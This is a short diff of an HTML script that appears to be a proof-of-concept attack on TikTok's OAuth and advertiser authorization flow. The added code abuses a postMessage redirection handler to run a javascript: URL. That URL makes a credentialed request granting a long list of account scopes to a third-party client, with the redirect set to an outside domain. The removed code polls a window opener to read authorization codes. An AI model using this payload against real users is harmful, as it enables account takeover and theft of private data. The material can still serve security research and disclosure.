@@ -1,29 +1,6 @@
 <script>
-  const clientKey = "aw8cb3204x0a1g88";
-  const redirectUri = encodeURIComponent("https://ads.tiktok.com/i18n/login/");
-
-  const url = `https://www.tiktok.com/v2/auth/authorize/?client_key=${clientKey}&disable_auto_auth=0&response_type=code&scope=user.setting.update,user.setting.list,bizpartner.user.info,bizpartner.item.info,biz.account.info,biz.account.phone,biz.account.email,user.info.basic,user.info.profile,user.info.stats,user.account.type,user.info.email,user.info.phone,video.list.no_watermark,video.list.private_ads.no_watermark,user.account.configure,video.list.manage,message.list.admin,biz.promote.create,biz.promote.upgrade_stats&lang=en&state=asd&disable_auto_auth=1&redirect_uri=${redirectUri}`;
-
-  const authWindow = window.open(url, "_blank");
-
-  (function pollOpener() {
-    if (!window.opener || window.opener.closed) return;
-    
-    try {
-      const href = window.opener.location.href;
-      
-      if (href.includes('code=')) {
-        const urlParams = new URL(href).searchParams;
-        const authCode = urlParams.get('code');
-        
-        alert("Authorization Code: " + authCode);
-        
-        return;
-      } else {
-        setTimeout(pollOpener, 500);
-      }
-    } catch (e) {
-      setTimeout(pollOpener, 500); 
-    }
-  })();
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:fetch('https://ads.tiktok.com/marketing_api/api/advertiser/authorize/?msToken=&X-Bogus=&_signature=',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({'scope':[10000,1,2,4,6,7,8,3,9,18000000,15000000,12000000,19000000,5,13000000,14000000,16000000,17000000,'7043626160646946818','7050363942434013185','7263200645266554881','7294180478502830081','7302558519668703234','7336834092152913922','7420916749769408513'],'redirect':true,'state':'your_custom_params','timezone_name':'Asia/Kolkata','browser_language':'en-US','cookie_enabled':true,'screen_width':1710,'screen_height':955,'browser_platform':'MacIntel','browser_name':'Mozilla','browser_version':'5.0 (Macintosh)','initial_timestamp':'1746595155153','client_id':'7480799711721439248','user_type':1,'redirect_uri':'https://imran.com'})}).then(response=>response.text()).then(alert).catch(console.error);"
+}, "*");
 </script>
